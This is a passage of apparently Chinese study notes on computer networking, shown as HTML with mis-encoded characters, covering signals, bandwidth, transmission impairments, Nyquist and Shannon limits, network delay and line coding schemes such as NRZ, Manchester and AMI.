å››å±‚æ¨¡å‹ä¸­çš„ä¼ è¾“å±‚ï¼Œä¸ºèµ‹äºˆå¯¹åº”é€šä¿¡è¿›ç¨‹çš„æ ‡è¯†ç¬¦ï¼Œå…¶é•¿åº¦ä¸º 16 ä½</p><h4 id="ä¸“ç”¨åœ°å€ï¼ˆprivate-addressï¼‰"><a href="#ä¸“ç”¨åœ°å€ï¼ˆprivate-addressï¼‰" class="headerlink" title="*ä¸“ç”¨åœ°å€ï¼ˆprivate addressï¼‰"></a>*ä¸“ç”¨åœ°å€ï¼ˆprivate addressï¼‰</h4><p>å¯¹åº” TCP&#x2F;IP å››å±‚æ¨¡å‹ä¸­çš„åº”ç”¨å±‚ï¼Œéƒ¨åˆ†é¢å‘ç”¨æˆ·çš„åº”ç”¨è¢«è®¾è®¡ä¸ºä¸“ç”¨åœ°å€ï¼ˆä¾‹å¦‚é‚®ä»¶åœ°å€ã€URLç­‰ï¼‰</p><h1 id="00x02-ç‰©ç†å±‚å’Œä»‹è´¨"><a href="#00x02-ç‰©ç†å±‚å’Œä»‹è´¨" class="headerlink" title="00x02.ç‰©ç†å±‚å’Œä»‹è´¨"></a>00x02.ç‰©ç†å±‚å’Œä»‹è´¨</h1><blockquote><p>ç¬”è€…æœ€è®¨åŒçš„ç‰©ç†éƒ¨åˆ†ï¼ˆç¬‘ï¼‰</p><p>ä¸€äº›åŸºæœ¬æ¦‚å¿µè¿™é‡Œå°±ä¸å†æ‰‹æŠ„ä¸€éäº†ï¼Œä¸æ‡‚çš„è‡ªå·±ç™¾åº¦ï¼ˆï¼‰</p></blockquote><h2 id="Chapter-3-æ•°æ®å’Œä¿¡å·"><a href="#Chapter-3-æ•°æ®å’Œä¿¡å·" class="headerlink" title="Chapter 3 - æ•°æ®å’Œä¿¡å·"></a>Chapter 3 - æ•°æ®å’Œä¿¡å·</h2><p>æ•°æ®è‹¥è¦è¿›è¡Œä¼ è¾“ï¼Œåˆ™å¿…é¡»è¦å°†å…¶è½¬ä¸ºç”µç£ä¿¡å·çš„å½¢å¼</p><h3 id="3-1-å‘¨æœŸæ¨¡æ‹Ÿä¿¡å·"><a href="#3-1-å‘¨æœŸæ¨¡æ‹Ÿä¿¡å·" class="headerlink" title="3.1 å‘¨æœŸæ¨¡æ‹Ÿä¿¡å·"></a>3.1 å‘¨æœŸæ¨¡æ‹Ÿä¿¡å·</h3><p>æœ€ç®€å•çš„å‘¨æœŸæ¨¡æ‹Ÿä¿¡å·ä¸º<strong>æ­£å¼¦æ³¢</strong>ï¼Œç”±å¤šä¸ªæ­£å¼¦æ³¢ç»„æˆçš„ä¿¡å·ä¸ºå¤åˆå‹æ¨¡æ‹Ÿä¿¡å·ï¼Œæˆ‘ä»¬ä½¿ç”¨<strong>å¤åˆä¿¡å·</strong>ï¼ˆcomposite signalï¼‰æ¥è¿›è¡Œæ•°æ®é€šä¿¡</p><h4 id="å¸¦å®½ï¼ˆbandwidthï¼‰"><a href="#å¸¦å®½ï¼ˆbandwidthï¼‰" class="headerlink" title="å¸¦å®½ï¼ˆbandwidthï¼‰"></a>å¸¦å®½ï¼ˆbandwidthï¼‰</h4><p><strong>å¤åˆä¿¡å·åŒ…å«çš„é¢‘ç‡èŒƒå›´ç§°ä¸ºå¸¦å®½</strong>ï¼Œå³å¸¦å®½é€šå¸¸ä¸ºä¿¡å·æœ€é«˜é¢‘ç‡ä¸æœ€ä½é¢‘ç‡çš„å·®å€¼</p><h3 id="3-2-æ•°å­—ä¿¡å·"><a href="#3-2-æ•°å­—ä¿¡å·" class="headerlink" title="3.2 æ•°å­—ä¿¡å·"></a>3.2 æ•°å­—ä¿¡å·</h3><blockquote><p>â€œã€Šæ•°å­—ä¿¡å·å¤„ç†ã€‹ï¼Œä¸€ç« æ²¡çœ‹â€</p></blockquote><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°å­—ä¿¡å·è¡¨ç¤ºæ•°æ®â€”â€”<strong>å°†ä¸åŒçš„æ•°æ®ç¼–ç ä¸ºä¸åŒçš„ç”µå¹³</strong>ï¼Œä¾‹å¦‚å°† 1 ç¼–ç ä¸ºæ­£ç”µå¹³è€Œ 0 ç¼–ç ä¸º 0 ç”µå¹³ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¯¹äº L ä¸ªä¸åŒçš„ç”µå¹³è€Œè¨€ï¼Œæ¯ä¸ªç”µå¹³å¯ä»¥è¡¨ç¤º log<sub>2</sub>L ä¸ªä½</p><p>åŸºäº_å‚…é‡Œå¶åˆ†æ_ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºï¼šæ•°å­—ä¿¡å·ä¸º<strong>å¸¦å®½æ— é™å¤§çš„å¤åˆæ¨¡æ‹Ÿä¿¡å·</strong>ã€‚</p><h4 id="æ¯”ç‰¹ç‡ï¼ˆbit-rateï¼‰"><a href="#æ¯”ç‰¹ç‡ï¼ˆbit-rateï¼‰" class="headerlink" title="æ¯”ç‰¹ç‡ï¼ˆbit rateï¼‰"></a>æ¯”ç‰¹ç‡ï¼ˆbit rateï¼‰</h4><p>æ¯”ç‰¹ç‡å³ä¸º<strong>ä¸€ç§’ä¸­æ‰€å‘é€çš„ä½æ•°</strong>ï¼Œå•ä½ä¸º<strong>ä½æ¯ç§’</strong>ï¼ˆ<strong>bits per secondï¼Œå³ bps</strong>ï¼‰</p><h4 id="ä½é•¿ï¼ˆbit-lengthï¼‰"><a href="#ä½é•¿ï¼ˆbit-lengthï¼‰" class="headerlink" title="ä½é•¿ï¼ˆbit lengthï¼‰"></a>ä½é•¿ï¼ˆbit lengthï¼‰</h4><p>ä½é•¿å³ä¸º<strong>ä¸€ä¸ªä½åœ¨ä¼ è¾“ä»‹è´¨ä¸Šçš„è·ç¦»</strong>ï¼Œæœ‰å¦‚ä¸‹å…¬å¼ï¼š</p><p>$$<br>ä½é•¿ &#x3D; ä¼ æ’­é€Ÿåº¦ Ã— ä½æŒç»­æ—¶é—´<br>$$</p><h4 id="æ•°å­—ä¿¡å·çš„ä¼ è¾“"><a href="#æ•°å­—ä¿¡å·çš„ä¼ è¾“" class="headerlink" title="æ•°å­—ä¿¡å·çš„ä¼ è¾“"></a>æ•°å­—ä¿¡å·çš„ä¼ è¾“</h4><h5 id="åŸºå¸¦ä¼ è¾“"><a href="#åŸºå¸¦ä¼ è¾“" class="headerlink" title="åŸºå¸¦ä¼ è¾“"></a>åŸºå¸¦ä¼ è¾“</h5><p>å³é€šè¿‡é€šé“ç›´æ¥å‘é€æ•°å­—ä¿¡å·ï¼Œè€Œéè½¬ä¸ºæ¨¡æ‹Ÿä¿¡å·ï¼Œ<strong>éœ€è¦ä¸€ä¸ªå¸¦å®½ä¸‹é™é¢‘ç‡ä¸º 0 çš„ä½é€šé€šé“</strong></p><h5 id="å®½å¸¦ä¼ è¾“ï¼ˆä½¿ç”¨è°ƒåˆ¶ï¼‰"><a href="#å®½å¸¦ä¼ è¾“ï¼ˆä½¿ç”¨è°ƒåˆ¶ï¼‰" class="headerlink" title="å®½å¸¦ä¼ è¾“ï¼ˆä½¿ç”¨è°ƒåˆ¶ï¼‰"></a>å®½å¸¦ä¼ è¾“ï¼ˆä½¿ç”¨è°ƒåˆ¶ï¼‰</h5><p>å³å°†æ•°å­—ä¿¡å·<strong>è½¬æ¢æˆæ¨¡æ‹Ÿä¿¡å·ä¼ è¾“</strong>ï¼Œè°ƒåˆ¶å…è®¸æˆ‘ä»¬ä½¿ç”¨<strong>å¸¦é€šé€šé“</strong></p><h3 id="3-3-ä¼ è¾“å‡æŸ"><a href="#3-3-ä¼ è¾“å‡æŸ" class="headerlink" title="3.3 ä¼ è¾“å‡æŸ"></a>3.3 ä¼ è¾“å‡æŸ</h3><h4 id="è¡°å‡ï¼ˆattenuationï¼‰"><a href="#è¡°å‡ï¼ˆattenuationï¼‰" class="headerlink" title="è¡°å‡ï¼ˆattenuationï¼‰"></a>è¡°å‡ï¼ˆattenuationï¼‰</h4><p>å³ä¿¡å·å¼ºåº¦è¡°å‡ï¼Œè¿™æ„å‘³ç€èƒ½é‡çš„æŸå¤±ï¼Œä¸ºäº†è¡¥å¿è¡°å‡çš„èƒ½é‡é€šå¸¸ä¼šç”¨æ”¾å¤§å™¨æ”¾å¤§ä¿¡å·ã€‚</p><p><img src="https://i.loli.net/2021/10/11/To8UcnqVvRC2dlK.png" alt="image.png"></p><h5 id="åˆ†è´ï¼ˆdecibelï¼Œ-DBï¼‰"><a href="#åˆ†è´ï¼ˆdecibelï¼Œ-DBï¼‰" class="headerlink" title="åˆ†è´ï¼ˆdecibelï¼Œ DBï¼‰"></a>åˆ†è´ï¼ˆdecibelï¼Œ DBï¼‰</h5><p>åˆ†è´ç”¨äºæè¿°ä¿¡å·æŸå¤±&#x2F;å¢ç›Šçš„å¼ºåº¦ï¼š<strong>è‹¥ä¿¡å·è¡°å‡äº†ï¼Œåˆ™åˆ†è´ä¸ºè´Ÿå€¼ï¼›è‹¥ä¿¡å·è¢«æ”¾å¤§äº†ï¼Œåˆ™åˆ†è´ä¸ºæ­£å€¼</strong></p><p>è®¾ P<sub>1</sub> ä¸ P <sub>2</sub> ä¸ºä¿¡å·åœ¨ä½ç½® 1ã€2 å¤„çš„åŠŸç‡ï¼Œåˆ™åˆ†è´ä¸ºï¼š<br>$$<br>dB &#x3D; 10 log_{10}\frac{P_2}{P_1}<br>$$</p><h4 id="å¤±çœŸï¼ˆdistortionï¼‰"><a href="#å¤±çœŸï¼ˆdistortionï¼‰" class="headerlink" title="å¤±çœŸï¼ˆdistortionï¼‰"></a>å¤±çœŸï¼ˆdistortionï¼‰</h4><p>å³ä¿¡å·çš„å½¢çŠ¶æˆ–å½¢æ€å‘ç”Ÿäº†æ”¹å˜</p><p><img src="https://i.loli.net/2021/10/11/Dl49Asgq7dZj3GH.png" alt="image.png"></p><h4 id="å™ªå£°ï¼ˆnoiseï¼‰"><a href="#å™ªå£°ï¼ˆnoiseï¼‰" class="headerlink" title="å™ªå£°ï¼ˆnoiseï¼‰"></a>å™ªå£°ï¼ˆnoiseï¼‰</h4><p>å™ªå£°å³ä¸ºç”±å„ç§ç¯å¢ƒå› ç´ <strong>é™„åŠ åœ¨åŸå§‹ä¿¡å·ä¸Šçš„é¢å¤–çš„åƒåœ¾ä¿¡å·</strong></p><p><img src="https://i.loli.net/2021/10/11/MqDXOFIm6rgdh1s.png" alt="image.png"></p><h5 id="ä¿¡å™ªæ¯”ï¼ˆsignal-to-noise-ratioï¼ŒSNRï¼‰"><a href="#ä¿¡å™ªæ¯”ï¼ˆsignal-to-noise-ratioï¼ŒSNRï¼‰" class="headerlink" title="ä¿¡å™ªæ¯”ï¼ˆsignal-to-noise ratioï¼ŒSNRï¼‰"></a>ä¿¡å™ªæ¯”ï¼ˆsignal-to-noise ratioï¼ŒSNRï¼‰</h5><p>ä¿¡å™ªæ¯”ç”¨ä»¥æè¿°ä¿¡å·è¢«å™ªå£°ç ´åçš„ç¨‹åº¦ï¼Œè®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š<br>$$<br>SNR&#x3D;\frac{å¹³å‡ä¿¡å·åŠŸç‡}{å¹³å‡å™ªå£°åŠŸç‡}<br>$$<br>å®¹æ˜“çœ‹å‡ºï¼ŒSNR è¶Šé«˜ï¼Œä¿¡å·è¢«ç ´åçš„è¶Šå°‘ï¼Œåä¹‹äº¦ç„¶</p><h3 id="3-4-æ•°æ®é€Ÿç‡é™åˆ¶"><a href="#3-4-æ•°æ®é€Ÿç‡é™åˆ¶" class="headerlink" title="3.4 æ•°æ®é€Ÿç‡é™åˆ¶"></a>3.4 æ•°æ®é€Ÿç‡é™åˆ¶</h3><p>æ•°æ®é€Ÿç‡å³<strong>æ¯ç§’ä¼ è¾“çš„æ¯”ç‰¹æ•°</strong>ï¼Œå³<strong>æ¯”ç‰¹ç‡</strong>ï¼Œé€šå¸¸å–å†³äºä»¥ä¸‹ä¸‰ä¸ªå› ç´ ï¼š</p><ul><li>æœ‰æ•ˆå¸¦å®½</li><li>ä½¿ç”¨çš„ä¿¡å·ç”µå¹³æ•°</li><li>é€šé“çš„è´¨é‡ï¼ˆå™ªå£°ç”µå¹³ï¼‰</li></ul><h4 id="æ— å™ªå£°é€šé“ï¼šå¥ˆå¥æ–¯ç‰¹æ¯”ç‰¹ç‡"><a href="#æ— å™ªå£°é€šé“ï¼šå¥ˆå¥æ–¯ç‰¹æ¯”ç‰¹ç‡" class="headerlink" title="æ— å™ªå£°é€šé“ï¼šå¥ˆå¥æ–¯ç‰¹æ¯”ç‰¹ç‡"></a>æ— å™ªå£°é€šé“ï¼šå¥ˆå¥æ–¯ç‰¹æ¯”ç‰¹ç‡</h4><p>å¯¹äºæ— å™ªå£°çš„ç†æƒ³é€šé“ï¼Œ<strong>å¥ˆå¥æ–¯ç‰¹æ¯”ç‰¹ç‡</strong>ï¼ˆ<strong>Nyquist bit rate</strong>ï¼‰å…¬å¼å®šä¹‰äº†ç†è®ºä¸Šçš„<strong>æœ€å¤§</strong>æ¯”ç‰¹ç‡ï¼š<br>$$<br>æ¯”ç‰¹ç‡ &#x3D; 2 Ã— å¸¦å®½ Ã— log_2L<br>$$<br>å…¶ä¸­ <code>L</code> ä¸ºä½¿ç”¨çš„ä¿¡å·ç”µå¹³æ•°é‡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ L çš„å¢åŠ ä¼šå‡å¼±ç³»ç»Ÿçš„å¯é æ€§</p><h4 id="å™ªå£°é€šé“ï¼šé¦™å†œå®¹é‡å®šç†"><a href="#å™ªå£°é€šé“ï¼šé¦™å†œå®¹é‡å®šç†" class="headerlink" title="å™ªå£°é€šé“ï¼šé¦™å†œå®¹é‡å®šç†"></a>å™ªå£°é€šé“ï¼šé¦™å†œå®¹é‡å®šç†</h4><p>å¯¹äºæœ‰å™ªå£°çš„é€šé“ï¼Œå…¶ç†è®ºä¸Š<strong>æœ€å¤§</strong>æ¯”ç‰¹ç‡ä¸ºï¼š<br>$$<br>é€šé“å®¹é‡ &#x3D; é€šé“å¸¦å®½ Ã— log_2(1 + SNR)<br>$$<br>è¯¥å…¬å¼å®šä¹‰äº†é€šé“çš„ç‰¹æ€§è€Œéä¼ è¾“æ–¹å¼ï¼Œ<strong>å…¶é€Ÿç‡ä¸ä½¿ç”¨çš„ä¿¡å·ç”µå¹³æ•°é‡æ— å…³</strong></p><h3 id="3-5-æ€§èƒ½"><a href="#3-5-æ€§èƒ½" class="headerlink" title="3.5 æ€§èƒ½"></a>3.5 æ€§èƒ½</h3><p>æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹å‡ ä¸ªæ–¹é¢è¡¡é‡ç½‘ç»œçš„æ€§èƒ½</p><h4 id="å¸¦å®½"><a href="#å¸¦å®½" class="headerlink" title="å¸¦å®½"></a>å¸¦å®½</h4><p>é“¾è·¯é€Ÿåº¦çš„æ½œåœ¨è¡¡é‡å€¼ï¼Œä¸»è¦æœ‰ä¸¤ç§è¡¡é‡æ–¹å¼ï¼šä»¥èµ«å…¹è¡¡é‡&#x2F;ä»¥æ¯ç§’æ¯”ç‰¹æ•°è¡¡é‡</p><h4 id="ååé‡"><a href="#ååé‡" class="headerlink" title="ååé‡"></a>ååé‡</h4><p>å³å•ä½æ—¶é—´å†…æˆåŠŸä¼ è¾“çš„æ•°æ®é‡ï¼Œæ˜¯é“¾è·¯é€Ÿåº¦çš„å®é™…è¡¡é‡å€¼</p><h4 id="å»¶è¿Ÿ"><a href="#å»¶è¿Ÿ" class="headerlink" title="å»¶è¿Ÿ"></a>å»¶è¿Ÿ</h4><p>å»¶è¿Ÿå®šä¹‰äº†ç¬¬ä¸€ä¸ªä½ä»æºå¼€å§‹å‘å‡ºåˆ°æ•´ä¸ªæŠ¥æ–‡å®Œå…¨åˆ°è¾¾ç›®æ ‡æ‰€ç»å†çš„æ—¶é—´ï¼Œç”±ä»¥ä¸‹å››ä¸ªéƒ¨åˆ†ç»„æˆ</p><h5 id="ä¼ æ’­æ—¶é—´ï¼ˆpropagation-timeï¼‰"><a href="#ä¼ æ’­æ—¶é—´ï¼ˆpropagation-timeï¼‰" class="headerlink" title="ä¼ æ’­æ—¶é—´ï¼ˆpropagation timeï¼‰"></a>ä¼ æ’­æ—¶é—´ï¼ˆpropagation timeï¼‰</h5><p>å³ä¸€ä¸ªä½ä»æºä¼ è¾“åˆ°ç›®æ ‡æ‰€éœ€çš„æ—¶é—´ï¼Œé€šè¿‡<code>è·ç¦»â—ä¼ æ’­é€Ÿåº¦</code>è®¡ç®—è€Œå¾—</p><h5 id="ä¼ è¾“æ—¶é—´ï¼ˆtransmission-timeï¼‰"><a href="#ä¼ è¾“æ—¶é—´ï¼ˆtransmission-timeï¼‰" class="headerlink" title="ä¼ è¾“æ—¶é—´ï¼ˆtransmission timeï¼‰"></a>ä¼ è¾“æ—¶é—´ï¼ˆtransmission timeï¼‰</h5><p>å³ä¼ è¾“ä¸€ä¸ªæŠ¥æ–‡æ‰€éœ€çš„æ—¶é—´ï¼Œè®¡ç®—å…¬å¼ä¸º<code>æŠ¥æ–‡é•¿åº¦â—å¸¦å®½</code></p><h5 id="æ’é˜Ÿæ—¶é—´ï¼ˆqueuing-timeï¼‰"><a href="#æ’é˜Ÿæ—¶é—´ï¼ˆqueuing-timeï¼‰" class="headerlink" title="æ’é˜Ÿæ—¶é—´ï¼ˆqueuing timeï¼‰"></a>æ’é˜Ÿæ—¶é—´ï¼ˆqueuing timeï¼‰</h5><p>æ¯ä¸ªä¸­é—´æˆ–ç«¯è®¾å¤‡åœ¨å¤„ç†æŠ¥æ–‡å‰ä¿æŒæŠ¥æ–‡æ‰€éœ€çš„æ—¶é—´</p><h5 id="å¤„ç†å»¶è¿Ÿï¼ˆprocessing-delayï¼‰"><a href="#å¤„ç†å»¶è¿Ÿï¼ˆprocessing-delayï¼‰" class="headerlink" title="å¤„ç†å»¶è¿Ÿï¼ˆprocessing delayï¼‰"></a>å¤„ç†å»¶è¿Ÿï¼ˆprocessing delayï¼‰</h5><p>æ¥æ”¶è€…å¤„ç†æŠ¥æ–‡æ‰€éœ€æ—¶é—´</p><h2 id="Chapter-4-æ•°å­—ä¼ è¾“"><a href="#Chapter-4-æ•°å­—ä¼ è¾“" class="headerlink" title="Chapter 4 - æ•°å­—ä¼ è¾“"></a>Chapter 4 - æ•°å­—ä¼ è¾“</h2><h3 id="4-1-æ•°å­—åˆ°æ•°å­—è½¬æ¢"><a href="#4-1-æ•°å­—åˆ°æ•°å­—è½¬æ¢" class="headerlink" title="4.1 æ•°å­—åˆ°æ•°å­—è½¬æ¢"></a>4.1 æ•°å­—åˆ°æ•°å­—è½¬æ¢</h3><h4 id="çº¿è·¯ç¼–ç ï¼ˆline-codingï¼‰"><a href="#çº¿è·¯ç¼–ç ï¼ˆline-codingï¼‰" class="headerlink" title="çº¿è·¯ç¼–ç ï¼ˆline codingï¼‰"></a>çº¿è·¯ç¼–ç ï¼ˆline codingï¼‰</h4><p>çº¿è·¯ç¼–ç å³ä¸ºå°†æ•°å­—æ•°æ®è½¬æ¢ä¸ºæ•°å­—ä¿¡å·çš„è¿‡ç¨‹ï¼ˆ0110â€¦è½¬æ¢ä¸ºé«˜ä½ç”µå¹³ï¼‰ï¼Œé¦–å…ˆæ˜ç¡®å¦‚ä¸‹ä¸¤ä¸ªæ¦‚å¿µï¼š</p><ul><li><p><strong>æ•°æ®å…ƒç´ </strong>ï¼ˆdata elementï¼‰ï¼šæ•°æ®å…ƒç´ ä¸ºè¡¨ç¤ºä¸€å—ä¿¡æ¯çš„æœ€å°å®ä½“ï¼Œå³<strong>ä½</strong></p></li><li><p><strong>ä¿¡å·å…ƒç´ </strong>ï¼ˆsignal elementï¼‰ï¼šæ•°å­—ä¿¡å·çš„æœ€å°å•å…ƒ</p></li></ul><p>æ•°æ®å…ƒç´ ä¸ºæˆ‘ä»¬éœ€è¦å‘é€çš„æ•°æ®ï¼Œä¿¡å·å…ƒç´ åˆ™ä¸ºæˆ‘ä»¬å®é™…å‘é€çš„ä¿¡å·ï¼Œ<strong>æ¯”ç‡r</strong>ä¸º<strong>æ¯ä¸ªä¿¡å·å…ƒç´ æ‰€æ‰¿è½½çš„æ•°æ®å…ƒç´ çš„æ•°é‡</strong></p><p>ç”±ä»¥ä¸Šä¸¤ä¸ªæ¦‚å¿µæœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><ul><li><strong>æ•°æ®é€Ÿç‡</strong>ï¼ˆdata rateï¼‰ï¼š1 ç§’å†…å‘é€çš„æ•°æ®å…ƒç´ ï¼ˆä½ï¼‰çš„æ•°é‡ï¼ˆä¹Ÿå°±æ˜¯<strong>æ¯”ç‰¹ç‡</strong>ï¼‰ï¼Œå•ä½ä¸º bps</li><li><strong>ä¿¡å·é€Ÿç‡</strong>ï¼ˆsignal rateï¼‰ï¼š1 ç§’å†…å‘é€çš„ä¿¡å·å…ƒç´ çš„æ•°é‡ï¼Œå•ä½ä¸º<strong>æ³¢ç‰¹</strong>ï¼ˆbaudï¼‰ï¼Œå³<strong>æ³¢ç‰¹ç‡</strong></li></ul><blockquote><p>è¿™é‡Œæ³¨æ„ baud æœ¬èº«å°±åŒ…å«â€œæ¯ç§’â€çš„å«ä¹‰åœ¨å†…ï¼Œæ•…ä¸å­˜åœ¨â€œæ³¢ç‰¹æ¯ç§’â€çš„è¯´æ³•</p></blockquote><p>è®¾ <em>N</em> ä¸ºæ•°æ®é€Ÿç‡ï¼Œ<em>c</em> ä¸ºæƒ…å½¢å› å­ï¼Œ<em>S</em> ä¸ºä¿¡å·é€Ÿç‡ï¼Œæ•°æ®é€Ÿç‡ä¸ä¿¡å·é€Ÿç‡çš„å…³ç³»å¦‚ä¸‹ï¼š<br>$$<br>S &#x3D; c Ã— N Ã— \frac{1}{r}baud<br>$$<br>æœ€å°å¸¦å®½çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š<br>$$<br>B_{min} &#x3D; c Ã— N Ã— \frac{1}{r}<br>$$<br>è‹¥é€šé“å¸¦å®½æ’å®šä¸º B ï¼Œåˆ™æœ€å¤§æ•°æ®é€Ÿç‡ä¸ºï¼š<br>$$<br>N_{max} &#x3D; \frac{1}{c} Ã— B Ã— r<br>$$<br><strong>åŸºçº¿</strong>å³ä¸ºæ¥æ”¶æ–¹è®¡ç®—æ¥æ”¶åˆ°ä¿¡å·åŠŸç‡çš„è¿è¡Œå¹³å‡å€¼ï¼Œå¯¹äºä¸€é•¿ä¸²çš„ 0 æˆ– 1 çš„æ¥å—å¾ˆå®¹æ˜“å¼•èµ·åŸºçº¿çš„åç§»ï¼Œç§°ä¸º<strong>åŸºçº¿åç§»</strong>ï¼ˆbaseline wanderingï¼‰</p><p>å½“æ•°å­—ä¿¡å·ä¸­ç”µå¹³ä¿æŒä¸€æ®µæ—¶é—´çš„æ’å®šæ—¶ï¼Œé¢‘è°±ä¼šäº§ç”Ÿæ¥è¿‘ 0 çš„ä½é¢‘ï¼Œç§°ä¹‹ä¸º<strong>ç›´æµæˆåˆ†</strong></p><p><strong>è‡ªåŒæ­¥</strong>ï¼ˆself-synchronizationï¼‰ä¿¡å·åœ¨æ•°æ®ä¸­åŒ…å«æœ‰å®šæ—¶ä¿¡æ¯ï¼Œä»¥å®ç°åŒæ–¹æ—¶é’ŸåŒæ­¥</p><h4 id="ç¼–ç æ–¹æ¡ˆ"><a href="#ç¼–ç æ–¹æ¡ˆ" class="headerlink" title="ç¼–ç æ–¹æ¡ˆ"></a>ç¼–ç æ–¹æ¡ˆ</h4><p><img src="https://i.loli.net/2021/10/10/AXvGWmOlxhowsqR.png" alt="image.png"></p><h5 id="å•æç¼–ç æ–¹æ¡ˆï¼ˆUnipolarï¼‰"><a href="#å•æç¼–ç æ–¹æ¡ˆï¼ˆUnipolarï¼‰" class="headerlink" title="å•æç¼–ç æ–¹æ¡ˆï¼ˆUnipolarï¼‰"></a>å•æç¼–ç æ–¹æ¡ˆï¼ˆUnipolarï¼‰</h5><p>å³æ‰€æœ‰ä¿¡å·ç”µå¹³éƒ½åœ¨æ—¶é—´è½´çš„ä¸€è¾¹ï¼ˆæ—¶é—´è½´ä¸Šæ–¹æˆ–ä¸‹æ–¹ï¼‰</p><ul><li><strong>ä¸å½’é›¶</strong>ï¼ˆ<strong>Non-Return-to-Zero, NRZ</strong>ï¼‰æ–¹æ¡ˆï¼šæ­£ç”µå¹³å®šä¹‰ä¸º 1 è€Œè´Ÿç”µå¹³å®šä¹‰ä¸º 0ï¼Œåœ¨ä½ä¸­é—´ä¿¡å·ä¸ä¼šå›åˆ°0ï¼Œæœ‰ç€ <em><code>N/2 Bd</code></em> çš„å¹³å‡ä¿¡å·é€Ÿç‡</li></ul><h5 id="ææ€§ç¼–ç æ–¹æ¡ˆï¼ˆPolarï¼‰"><a href="#ææ€§ç¼–ç æ–¹æ¡ˆï¼ˆPolarï¼‰" class="headerlink" title="ææ€§ç¼–ç æ–¹æ¡ˆï¼ˆPolarï¼‰"></a>ææ€§ç¼–ç æ–¹æ¡ˆï¼ˆPolarï¼‰</h5><p>å³ä¿¡å·ç”µå¹³åˆ†å¸ƒåœ¨æ—¶é—´è½´çš„ä¸¤è¾¹</p><blockquote><p>ä¾‹å¦‚ 0 çš„ç”µå¹³ä¸ºæ­£æ•°è€Œ 1 çš„ç”µå¹³ä¸ºè´Ÿæ•°</p></blockquote><ul><li><p><strong>ä¸å½’é›¶</strong>ï¼ˆ<strong>Non-Return-to-Zero, NRZ</strong>ï¼‰æ–¹æ¡ˆï¼š</p><ul><li><strong>NRZ-L</strong>ï¼ˆ<strong>NRZç”µå¹³ç¼–ç ï¼Œå³ NRZ-Level</strong>ï¼‰ï¼šå³ç”±ä¿¡å·ç”µå¹³å†³å®šä½å€¼</li><li><strong>NRZ-I</strong>ï¼ˆ<strong>NRZåç›¸ç¼–ç ï¼Œå³ NRZ-Invert</strong>ï¼‰ï¼šä¿¡å·ç”µå¹³æ˜¯å¦åè½¬å†³å®šä½å€¼ï¼ˆä¸‹ä¸€ä¸ªä½ç”µå¹³æœªåè½¬ä¸º0ï¼Œåè½¬äº†å°±æ˜¯1ï¼‰</li></ul><p>è¿™ä¸¤ç§æ–¹æ¡ˆéƒ½æœ‰ç€ <em><code>N/2 Bd</code></em> çš„å¹³å‡ä¿¡å·é€Ÿç‡ï¼Œä¸”éƒ½å­˜åœ¨åŸºçº¿åç§»ã€åŒæ­¥é—®é¢˜ã€ç›´æµæˆåˆ†é—®é¢˜</p><p><img src="https://i.loli.net/2021/10/11/Y1DXC2Jc5SQAzZ8.png" alt="image.png"></p></li><li><p><strong>å½’é›¶ç¼–ç </strong>ï¼ˆ<strong>Return-to-Zeronï¼ŒRZ</strong>ï¼‰ï¼šä¿¡å·åœ¨ä½ä¸­é—´å˜åŒ–ï¼Œåœ¨æ¯ä¸ªä½ä¸­é—´ä¿¡å·å˜ä¸º0ï¼Œç”±ä¸¤ä¸ªä¿¡å·ç¼–ç ä¸€ä¸ªä½</p></li></ul><p><img src="https://i.loli.net/2021/10/11/iVKm2AzTeaB85n1.png" alt="image.png"></p><ul><li><p><strong>åŒç›¸ç¼–ç </strong>ï¼ˆ<strong>biphase</strong>ï¼‰ï¼š</p><ul><li><strong>æ›¼å½»æ–¯ç‰¹ç¼–ç æ–¹æ¡ˆ</strong>ï¼šä¸¤ä¸ªç”µå¹³ç¼–ç ä¸€ä¸ªä½ï¼ˆä¾‹å¦‚ã€è´Ÿ-æ­£ã€‘ä¸º1ï¼Œã€æ­£-è´Ÿã€‘ä¸º0ï¼‰</li><li><strong>å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç æ–¹æ¡ˆ</strong>ï¼šç±»ä¼¼äºæ›¼å½»æ–¯ç‰¹ç¼–ç ï¼Œä¸è¿‡ç”±è·³å˜å†³å®šä½å€¼ï¼ˆä¸‹ä¸€ä¸ªä¿¡å·çš„ç¬¬ä¸€ä¸ªç”µå¹³æœªè·³å˜ä¸º1ï¼Œè·³å˜ä¸º0)</li></ul><p>è¿™ä¸¤ç§ç¼–ç æ–¹æ¡ˆä¸­é—´çš„è·³å˜ç”¨ä»¥åŒæ­¥ï¼Œä¹Ÿä¸å­˜åœ¨åŸºçº¿åç§»ä¸ç›´æµæˆåˆ†çš„é—®é¢˜ï¼Œæœ‰ç€ <em><code>N Bd</code></em> çš„å¹³å‡ä¿¡å·é€Ÿç‡</p><p><img src="https://i.loli.net/2021/10/11/w9kZh3CxKt8DmcU.png" alt="image.png"></p></li></ul><h5 id="åŒææ€§æ–¹æ¡ˆï¼ˆbipolarï¼‰"><a href="#åŒææ€§æ–¹æ¡ˆï¼ˆbipolarï¼‰" class="headerlink" title="åŒææ€§æ–¹æ¡ˆï¼ˆbipolarï¼‰"></a>åŒææ€§æ–¹æ¡ˆï¼ˆbipolarï¼‰</h5><p>åˆç§°å¤šç”µå¹³äºŒè¿›åˆ¶ï¼Œå…¶ä¸­ä¸€ä¸ªæ•°æ®å…ƒç´ çš„ç”µå¹³å›ºå®šä¸º0ï¼Œå¦ä¸€ä¸ªåˆ™åœ¨æ­£è´Ÿå€¼é—´äº¤æ›¿ã€‚</p><ul><li><p><strong>AMI</strong>ï¼ˆalternate mark inversionï¼‰ï¼šä¸­å€¼0ç”µå¹³è¡¨ç¤º0ï¼Œ1ç”±äº¤æ›¿æ­£è´Ÿç”µå¹³è¡¨ç¤º</p></li><li><p><strong>ä¼ªä¸‰å…ƒç¼–ç </strong>ï¼šAMIçš„å˜å½¢ï¼Œä¸­å€¼0ç”µå¹³è¡¨ç¤º1ï¼Œ0ç”±äº¤æ›¿æ­£è´Ÿç”µå¹³è¡¨ç¤º</p></li></ul><p>  